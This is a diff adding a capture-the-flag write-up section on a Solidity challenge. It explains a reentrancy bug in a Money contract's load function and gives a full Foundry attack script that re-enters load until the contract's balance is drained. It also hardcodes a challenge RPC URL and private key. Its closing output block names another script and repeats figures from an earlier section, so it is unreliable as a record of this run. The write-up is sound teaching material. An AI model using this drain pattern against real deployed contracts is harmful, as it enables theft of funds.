@@ -566,3 +566,157 @@ Gas used: 160223
 == Logs ==
   isSolved:  true
 ```
+
+## **04. Unsolveable Money Captcha**
+
+> Oh no! Hackerika just made a super-duper mysterious block chain thingy!
+I'm not sure what she's up to, maybe creating a super cool bank app?
+But guess what? It seems a bit wobbly because it's asking us to solve a super tricky captcha!
+What a silly kid! Let's help her learn how to make a super-duper awesome contract with no head-scratching captcha! XD
+> 
+
+The goal of this challenge is to drain all the funds from the `moneyContract`. The Setup contract is as follows:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Money.sol";
+
+contract Setup {
+    Money public immutable moneyContract;
+    Captcha public immutable captchaContract;
+    constructor() payable {
+        require(msg.value == 100 ether);
+        captchaContract = new Captcha();
+        moneyContract = new Money(captchaContract);
+        moneyContract.save{value: 10 ether}();
+    }
+    function isSolved() public view returns (bool) {
+        return address(moneyContract).balance == 0;
+    }
+}
+```
+<br>
+
+In the `Money` Contract, funds can be deposited using the `save` function and withdrawn using the `load` function.
+
+```solidity
+function save() public payable {
+    require(msg.value > 0, "You don't have money XP");
+    balances[msg.sender] += msg.value;
+}
+
+function load(uint256 userProvidedCaptcha) public {
+    uint balance = balances[msg.sender];
+    require(balance > 0, "You don't have money to load XD");
+
+    uint256 generatedCaptcha = captchaContract.generateCaptcha(secret);
+    require(userProvidedCaptcha == generatedCaptcha, "Invalid captcha");
+
+    (bool success,) = msg.sender.call{value: balance}("");
+    require(success, 'Oh my god, what is that!?');
+    balances[msg.sender] = 0;
+}
+```
+<br>
+
+The load function contains a reentrancy attack vulnerability because it updates `balances[msg.sender]` after transferring the funds.
+
+```solidity
+(bool success,) = msg.sender.call{value: balance}("");
+require(success, 'Oh my god, what is that!?');
+balances[msg.sender] = 0;
+```
+
+### Solution Script
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+import {console} from "forge-std/console.sol";
+import {Script} from "forge-std/Script.sol";
+import {Setup} from "../src/UnsolveableMoneyCaptcha/Setup.sol";
+import {Money} from "../src/UnsolveableMoneyCaptcha/Money.sol";
+import {Captcha} from "../src/UnsolveableMoneyCaptcha/Captcha.sol";
+
+contract SolveUnsolveableMoneyCaptcha is Script {
+    address player;
+    uint256 playerPrivateKey;
+    
+    Setup setupInstance;
+    Money moneyInstance;
+    Captcha captchaInstance;
+
+    function setUp() external {
+        string memory rpcUrl = "http://45.32.119.201:44555/515adbcd-67c0-4c9a-86a5-110d82b92283";
+        playerPrivateKey = 0x35342fe50f9cb61e0596a086a7c2e1641a084135137c13456c5db0ec4e4d7adc;
+        address setUpContract = 0xccB5d206beaB580F352020b782cff04A80568E77;
+
+        player = vm.addr(playerPrivateKey);
+        vm.createSelectFork(rpcUrl);
+
+        setupInstance = Setup(setUpContract);
+        captchaInstance = setupInstance.captchaContract();
+        moneyInstance = setupInstance.moneyContract();
+    }
+
+    function run() external {
+        vm.startBroadcast(playerPrivateKey);
+
+        AttakContract attackcontractInstance = new AttakContract{value: 50 ether}(setupInstance, captchaInstance, moneyInstance);
+        
+        console.log("Before Player balance: ", moneyInstance.balances(player));
+        attackcontractInstance.attack();
+
+        console.log("After Player balance: ", moneyInstance.balances(player));
+        console.log("isSolved: ", setupInstance.isSolved());
+
+        vm.stopBroadcast();
+    }
+}
+
+contract AttakContract {
+    Setup setupInstance;
+    Captcha captchaInstance;
+    Money moneyInstance;
+
+    uint256 secret;
+
+    constructor(Setup _setupInstance, Captcha _captchaInstance, Money _moneyInstance) payable {
+        setupInstance = _setupInstance;
+        captchaInstance = _captchaInstance;
+        moneyInstance = _moneyInstance;
+    }
+
+    function attack() public {
+        moneyInstance.save{value: 10 ether}();
+
+        secret = moneyInstance.secret();
+        uint256 generatedCaptcha = captchaInstance.generateCaptcha(secret);
+        moneyInstance.load(generatedCaptcha);
+    }
+
+    receive() external payable {
+        if (address(moneyInstance).balance != 0) {
+            uint256 generatedCaptcha = captchaInstance.generateCaptcha(secret);
+            moneyInstance.load(generatedCaptcha);
+        }
+        
+    }
+}
+```
+
+```solidity
+$ forge script SolveExecutiveProblem
+[⠊] Compiling...
+[⠔] Compiling 19 files with Solc 0.8.26
+[⠒] Solc 0.8.27 finished in 1.45s
+Compiler run successful!
+Script ran successfully.
+Gas used: 160223
+
+== Logs ==
+  isSolved:  true
+```
